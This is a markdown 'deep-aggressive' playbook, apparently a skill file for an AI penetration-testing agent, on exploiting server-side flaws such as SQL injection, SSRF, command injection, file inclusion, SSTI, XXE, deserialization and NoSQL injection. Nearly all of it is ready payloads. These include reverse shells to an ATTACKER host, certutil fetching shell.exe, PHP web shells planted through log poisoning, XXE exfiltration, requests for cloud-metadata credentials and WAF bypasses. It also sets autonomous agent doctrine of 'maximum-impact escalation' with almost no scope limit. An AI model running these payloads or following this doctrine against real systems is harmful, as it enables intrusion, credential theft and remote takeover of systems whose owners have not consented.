---
skill: server-side-exploitation-deep-aggressive
mitre_attack_id: T1190
owasp_mapping: [A03, A05, A06, A08, A10]
difficulty: advanced
mode: deep-aggressive
tags: [sql-injection, ssrf, command-injection, lfi, ssti, xxe, deserialization, nosql, waf-bypass, cloud-metadata, reverse-shell]
---

# Deep Aggressive Mode Playbook: server-side-agent

> Purpose: This playbook is the deep-aggressive operational doctrine for exploiting server-side vulnerabilities. Each section covers detection, confirmation, maximum-impact escalation, WAF bypass, and OOB validation. Reference each class playbook under skills/penetration-testing/ for the full evidence-first methodology.

## Phase 1 — SQL Injection

Reference: skills/penetration-testing/sql-injection.md

1. Fingerprint the database first: `version()`, `@@version`, `DBMS_VERSION`, `WAITFOR DELAY '0:0:5'` vs `SLEEP(5)` vs `pg_sleep(5)`.
2. Enumeration: `ORDER BY N` for column count, `UNION SELECT NULL,NULL...` for UNION attacks, type discovery with `1,2,3` substitutions.
3. Extraction modes:
   - Boolean-based: compare true/false response differentials
   - Time-based: `SLEEP(5)` conditional via `AND IF(1=1,SLEEP(5),0)`
   - Error-based: `extractvalue(1,concat(0x7e,(SELECT version())))` (MySQL), `CONVERT(INT, ...)` (MSSQL)
   - OOB: `LOAD_FILE(concat('\\\\ATTACKER\\',(SELECT version())))` (MySQL), `EXEC xp_dirtree '\\\\ATTACKER\\'` (MSSQL), `COPY (SELECT ...) TO PROGRAM 'curl ATTACKER'` (PostgreSQL)
4. DB command escalation (sandbox only):
   - MSSQL: `EXEC xp_cmdshell 'certutil -urlcache -f http://ATTACKER/shell.exe C:\Windows\Temp\shell.exe'`
   - MySQL: `SELECT ... INTO OUTFILE '/var/www/html/shell.php'`
   - PostgreSQL: `COPY cmd_exec FROM PROGRAM 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'`
5. WAF bypass chain: space2comment, between, charencode, randomcase, %09, %0a, inline comments `/*!50000union*/`.
6. Verify every finding with sqlmap `--level=5 --risk=3` plus manual confirmation.

## Phase 2 — Server-Side Request Forgery

Reference: skills/penetration-testing/ssrf.md

1. Locate SSRF surfaces: URL-fetch functions, webhooks, PDF/image generators, redirect processors, proxy endpoints.
2. Localhost bypass: `http://127.0.0.1`, `http://localhost`, `http://0x7f000001`, `http://2130706433`, `http://[::1]`, decimal/octal/hex IP variants, DNS rebinding, alternate localhost names.
3. Protocol abuse: `file:///etc/passwd`, `dict://`, `gopher://`, `ldap://`, `ftp://`, `gopher://` to Redis/MySQL/FastCGI for RCE.
4. Cloud metadata:
   - AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   - GCP: `http://metadata.google.internal/computeMetadata/v1/` with `Metadata-Flavor: Google` header
   - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` with `Metadata: true`
   - Alibaba: `http://100.100.100.200/latest/meta-data/`
5. Blind SSRF confirmation via interactsh OOB callbacks; internal port scan via timing and status codes.
6. gopherus payloads: `gopherus --exploit redis`, `gopherus --exploit fastcgi`, `gopherus --exploit mysql` for internal service RCE.
7. Validate with ssrfmap `--level 5` plus manual reproduction.

## Phase 3 — Command Injection

Reference: skills/penetration-testing/command-injection.md

1. Identify injection points: ping, hostname, date, convert, DNS lookup, any parameter feeding a shell.
2. Injection characters: `;`, `|`, `||`, `&&`, `` ` ``, `$()`, `%0a`, `<`/`>` for output redirection.
3. Confirmation:
   - Echo marker: `; echo INJECTION_SUCCESS`
   - Time-based: `; sleep 5` and measure response time
   - OOB DNS: `; nslookup UNIQUE.attacker.interactsh` or `; ping -c 1 UNIQUE.collab`
4. Filter bypass: `${IFS}` instead of spaces, quoted split `/bin/cat /etc/passwd` -> `/bin/cat${IFS}/etc/passwd`, wildcards `cat /etc/p*sswd`, hex `cat /etc/passwd` -> `cat $(echo -e \x2f\x65\x74\x63...)`, newline injection.
5. Escalate to reverse shell:
   - Bash: `bash -i >& /dev/tcp/ATTACKER/4444 0>&1`
   - Python: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
   - PHP: `php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
   - Perl/Ruby/Node equivalents for constrained runtimes
6. Validate with commix `--level=3 --risk=3` plus manual shell.

## Phase 4 — File Inclusion to RCE

Reference: skills/penetration-testing/file-inclusion.md

1. Detect parameter-driven file access: `?page=`, `?file=`, `?include=`, `?template=`, `?doc=`.
2. Directory traversal: `../`, `..%2f`, `%252e%252e`, double-encoding, backslashes `..\`, absolute paths.
3. Confirm with `/etc/passwd`, `C:\Windows\win.ini`, `C:\boot.ini`.
4. PHP wrappers: `php://filter/convert.base64-encode/resource=config.php`, `php://input` with POST body PHP code, `data://text/plain;base64,PD9waHA...`, `expect://id` (with expect module).
5. Log poisoning: inject `<?php system($_GET['c']); ?>` into User-Agent/Referer, then include `/var/log/apache2/access.log`, `/proc/self/fd/2`, `/var/log/nginx/access.log`.
6. Server-side include, JSP include, and template engine include abuse for non-PHP stacks.
7. Validate each LFI-to-RCE chain end-to-end and capture command output as proof.

## Phase 5 — Server-Side Template Injection

Reference: skills/penetration-testing/ssti.md

1. Detection payloads: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`; then fingerprint with `{{7*'7'}}` (49 = Jinja/Twig, 7777777 = Python string repetition).
2. Per-engine RCE:
   - Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
   - Twig: `{{['id']|filter('system')}}`
   - Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
   - ERB: `<%= system("id") %>`
   - Velocity: `#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))...`
   - Thymeleaf: `__${T(java.lang.Runtime).getRuntime().exec('id')}__`
   - Mustache/Handlebars: known helper/sandbox-escape chains
3. Sandbox escape paths for polyglot and secure-config engines.
4. Validate with tplmap `--os-shell` and manual RCE reproduction.

## Phase 6 — XML External Entity

Reference: skills/penetration-testing/xxe.md

1. In-band file read: `<!DOCTYPE x [<!ENTITY pwn SYSTEM "file:///etc/passwd">]><root>&pwn;</root>`.
2. Blind OOB: external DTD hosted at `http://ATTACKER/xxe.dtd`:
   `<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?x=%file;'>">%eval;%exfil;`
3. Error-based XXE: force parser errors to echo file contents in the error message.
4. SSRF via entity: `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`.
5. WAF bypass: encoded entities `&#x3c;`, alternate schemes `expect:`, `php://`, `jar:`, nested entities, parameter entity loops.
6. Office document XXE: inject DTD into DOCX/XLSX/PDF (if document parsing exists).
7. Validate with XXEinjector OOB plus manual reproducer; capture the exfiltrated content as proof.

## Phase 7 — Insecure Deserialization

Reference: skills/penetration-testing/insecure-deserialization.md

1. Identify serialized blobs by magic bytes: `AC ED 00 05` (Java), `rO0AB` (base64 Java), `O:` (PHP), `80 04` pickle (Python), `00 01 00 00 00 FF FF` (.NET), `BAH`/`%BA%05` (Ruby).
2. Locate entry points: hidden params, cookies (rememberMe, session), request body fields, HTTP headers, signed-but-unencrypted tokens.
3. Blind detection: ysoserial `URLDNS` to observe an OOB DNS callback.
4. Java chains: `ysoserial CommonsCollections1 'id'`; chain selection based on classpath libraries.
5. PHP chains: `phpggc -p base64 Monolog/RCE1 system 'id'`.
6. Python: `pickle` `__reduce__` RCE; Ruby: `Marshal` gadget chains; .NET: ysoserial.net chains.
7. Validate by executing in sandbox, capture `id`/`whoami` output, then hand the working chain to exploit-poc-agent.

## Phase 8 — NoSQL Injection

Reference: skills/penetration-testing/nosql-injection.md

1. Identify NoSQL-backed endpoints (MongoDB, CouchDB, Elasticsearch, Firestore) via API shape and error messages.
2. Operator injection: replace string values with `{"$ne":null}`, `{"$gt":""}`, `{"$regex":".*"}`, `{"$in":[...]}` in JSON bodies and URL params.
3. Auth bypass: `password={"$ne":""}` or `username={"$gt":""}` to bypass login.
4. Regex oracle: `{"$regex":"^a.*"}` to enumerate characters via boolean responses.
5. `$where` JavaScript injection for timing oracle and RCE: `{"$where":"this.password.length>0 && sleep(5000)"}`.
6. Data extraction with `$regex` character-by-character and dump via error messages.
7. Validate all findings manually plus automated scanner where available.

## Phase 9 — Verification

1. Every confirmed vulnerability requires at least two independent confirmations (two tools or tool + manual).
2. OOB channels (interactsh, collaborator) used for all blind injections.
3. Extract proof data: file contents, query results, command output — stored under evidence/.
4. Escalation attempts (shell, cloud credentials, file read) fully documented with output.
5. WAF bypass steps recorded so the chain is reproducible by other agents.
6. Findings passed to exploit-poc-agent with the exact request/response pairs.

## Skill Library References
- skills/penetration-testing/sql-injection.md
- skills/penetration-testing/ssrf.md
- skills/penetration-testing/command-injection.md
- skills/penetration-testing/file-inclusion.md
- skills/penetration-testing/ssti.md
- skills/penetration-testing/xxe.md
- skills/penetration-testing/insecure-deserialization.md
- skills/penetration-testing/nosql-injection.md
- skills/network-security/protocol-exploitation.md
